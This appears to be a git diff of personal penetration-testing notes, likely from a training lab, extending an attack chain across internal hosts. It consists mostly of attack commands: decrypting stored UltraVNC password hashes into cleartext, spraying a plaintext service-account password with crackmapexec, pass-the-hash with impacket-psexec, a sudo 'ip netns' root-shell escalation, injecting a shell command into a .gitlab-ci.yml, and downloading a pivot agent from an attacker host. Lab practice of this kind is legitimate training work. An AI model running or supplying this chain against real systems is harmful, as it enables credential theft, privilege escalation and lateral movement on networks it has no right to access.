@@ -79,10 +79,18 @@ Get-ChildItem -Path C:\ -Include *.ini -File -Recurse -ErrorAction SilentlyConti
 # find vnc file
 cat C:\"Program Files"\"uvnc bvba"\UltraVNC\ultravnc.ini
 
-# obtain vnc passwords
+# obtain vnc password hashes
 passwd=BFE825DE515A335BE3
 passwd2=59A04800B111ADB060
 
+# decrypt using vncpasswd python script - https://github.com/trinitronx/vncpasswd.py
+git clone https://github.com/trinitronx/vncpasswd.py.git vncpasswd.py
+cd vncpasswd.py
+python2 ./vncpasswd.py --help
+python2 ./vncpasswd.py --decrypt 59A04800B111ADB060 --hex
+# use the bin result - ABCDEFGH
+python2 ./vncpasswd.py --decrypt BFE825DE515A335BE3 --hex
+# R3S3+rcH
 ```
 .220 privesc
 ```
@@ -228,10 +236,6 @@ iwr -uri http://192.168.45.229/agent.exe -Outfile agent.exe
 
 # 22,5901
 sudo nmap -p- -Pn 10.10.119.10 -sS -T 5 --verbose
-vncviewer 10.10.119.10::5901
-# need password from 220
-passwd=BFE825DE515A335BE3
-passwd2=59A04800B111ADB060
 
 # 445, 5985
 sudo nmap -p- -Pn 10.10.76.11 -sS -T 5 --verbose
@@ -241,15 +245,43 @@ crackmapexec smb 10.10.76.11 -u backup_service -p It4Server --continue-on-succes
 crackmapexec smb -u backup_service -p 'It4Server' -X "whoami" 10.10.76.11
 crackmapexec winrm 10.10.76.11 -u backup_service -p It4Server --continue-on-success --local-auth
 
-
 #22,139,445,8080
 sudo nmap -p- -Pn 10.10.76.12 -sS -T 5 --verbose
-
 
 sudo nmap -p- -Pn 10.10.76.13 -sS -T 5 --verbose
 crackmapexec smb 10.10.76.13 -u backup_service -p It4Server --continue-on-success
 crackmapexec winrm 10.10.76.13 -u backup_service -p It4Server --continue-on-success
 impacket-psexec -hashes :17add237f30abaecc9d884f72958b928 Administrator@10.10.76.13 
+
+```
+
+.10
+```
+# 22,5901
+sudo nmap -p- -Pn 10.10.119.10 -sS -T 5 --verbose
+vncviewer 10.10.119.10::5901
+# need password from 220 - the first password works
+passwd=R3S3+rcH
+passwd2=ABCDEFGH
+```
+
+.10 privesc
+```
+sudo -l
+# have sudo on ss and ip
+https://gtfobins.github.io/gtfobins/ip/#sudo
+sudo ip netns add foo
+sudo ip netns exec foo /bin/bash
+```
+
+.10 -> .14 (another level of internal network)
+```
+# in research dir add shell command
+vi scratchpad/.gitlab-ci.yml
+
+# setup pivot to 14
+wget http://192.168.45.229/agent -o agent
+chmod +x agent
 
 ```
 
